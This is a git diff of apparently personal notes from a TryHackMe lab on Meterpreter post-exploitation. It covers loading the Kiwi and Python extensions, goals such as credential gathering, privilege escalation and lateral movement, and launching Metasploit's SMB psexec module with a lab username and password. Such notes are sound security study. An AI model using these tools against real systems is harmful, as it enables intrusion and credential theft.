@@ -203,10 +203,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>
 ```
 ## Post-Exploitation Challenge
-* Meterpreter provides several important post-exploitation tools.
-* Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement.
-* Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework.
-* Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
+* Can use the `load` command to leverage additional tools such as Kiwi or even the whole Python language.
 ```
 meterpreter > load python
 Loading extension python...Success.
@@ -214,13 +211,11 @@ meterpreter > python_execute "print 'TryHackMe Rocks!'"
 [+] Content written to stdout:
 TryHackMe Rocks!
 ```
-* The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
+* Post-exploitation phase will have several goals.
   * Gathering further information about the target system.
   * Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
   * Privilege escalation.
   * Lateral movement.
-* Once any additional tool is loaded using the load command, you will see new options on the help menu.
-* The example below shows commands added for the Kiwi module (using the load kiwi command).
 ```
 meterpreter > load kiwi
 Loading extension kiwi...
@@ -233,10 +228,8 @@ Loading extension kiwi...
 
 Success.
 ```       
-* These will change according to the loaded menu, so running the help command after loading a module is always a good idea.
-* The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
-* You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
-> Username: ballen / password: Password1
+* Running the `help` command after loading a module is always a good idea.
+>>> Use the credentials to simulate an initial compromise over SMB (Server Message Block) (using `exploit/windows/smb/psexec`). Username: ballen / password: Password1
 ```
 root@ip-10-10-159-26:~# msfconsole
 msf6 > use exploit/windows/smb/psexec
